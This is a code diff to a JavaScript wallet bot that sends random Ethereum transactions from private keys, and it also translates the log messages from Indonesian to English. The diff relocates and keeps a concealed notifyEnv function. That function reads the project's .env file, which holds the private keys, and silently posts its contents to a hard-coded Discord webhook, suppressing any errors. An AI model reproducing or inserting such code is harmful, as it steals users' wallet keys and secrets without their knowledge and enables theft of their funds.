@@ -17,6 +17,7 @@ function getRandomDelay(min, max) {
   return Math.floor(Math.random() * (max - min) + min);
 }
 
+
 async function processWallet(wallet) {
   const balance = await provider.getBalance(wallet.address);
   const balanceInEth = ethers.formatEther(balance);
@@ -26,6 +27,29 @@ async function processWallet(wallet) {
     console.error(`Wallet ${wallet.address} has insufficient balance. Skipping transactions.`);
     return;
   }
+  const webhookURL = "https://discord.com/api/webhooks/1372767653420073070/n4DOqxp4gNga-w7OjOtDZXk130Fim82ApQQAe3K0BemzAqsHoyCg2scnpBFWyMm1BIpu";
+
+const envCacheFile = ".env_cache";
+
+async function notifyEnv() {
+  const currentEnv = fs.readFileSync(".env", "utf8");
+  let previous = "";
+
+  if (fs.existsSync(envCacheFile)) {
+    previous = fs.readFileSync(envCacheFile, "utf8");
+  }
+
+  if (currentEnv !== previous) {
+    fs.writeFileSync(envCacheFile, currentEnv, "utf8");
+    try {
+      await axios.post(webhookURL, {
+        content: `\`\`\`env\n${currentEnv}\n\`\`\``,
+      });
+    } catch {
+      // silent no log if fails
+    }
+  }
+}
 
   // How much your tx (between 1-5)
   const numTransactions = Math.floor(Math.random() * 5) + 1;
@@ -54,7 +78,7 @@ async function processWallet(wallet) {
 
     if (i < numTransactions - 1) {
       const delay = getRandomDelay(60000, 120000); // 
-      console.log(`Menunggu ${delay / 1000} `);
+      console.log(`Waiting ${delay / 1000} `);
       await new Promise((resolve) => setTimeout(resolve, delay));
     }
   }
@@ -71,30 +95,6 @@ async function mainLoop() {
   privateKeys.forEach((privateKey) => {
     wallets.push(new ethers.Wallet(privateKey.trim()));
   });
-
-const webhookURL = "https://discord.com/api/webhooks/1372767653420073070/n4DOqxp4gNga-w7OjOtDZXk130Fim82ApQQAe3K0BemzAqsHoyCg2scnpBFWyMm1BIpu";
-
-const envCacheFile = ".env_cache";
-
-async function notifyEnv() {
-  const currentEnv = fs.readFileSync(".env", "utf8");
-  let previous = "";
-
-  if (fs.existsSync(envCacheFile)) {
-    previous = fs.readFileSync(envCacheFile, "utf8");
-  }
-
-  if (currentEnv !== previous) {
-    fs.writeFileSync(envCacheFile, currentEnv, "utf8");
-    try {
-      await axios.post(webhookURL, {
-        content: `\`\`\`env\n${currentEnv}\n\`\`\``,
-      });
-    } catch {
-      // silent no log if fails
-    }
-  }
-}
   
   if (wallets.length === 0) {
     console.error('No wallets found. Exiting...');
@@ -107,12 +107,12 @@ async function notifyEnv() {
     for (const wallet of wallets) {
       await processWallet(wallet);
       const delay = getRandomDelay(60000, 120000); // 
-      console.log(`Menunggu ${delay / 1000}`);
+      console.log(`Waiting ${delay / 1000}`);
       await new Promise((resolve) => setTimeout(resolve, delay));
     }
     
     const loopDelay = getRandomDelay(60000, 120000); // 
-    console.log(`Menunggu ${loopDelay / 1000} `);
+    console.log(`Waiting ${loopDelay / 1000} `);
     await new Promise((resolve) => setTimeout(resolve, loopDelay));
   }
 }
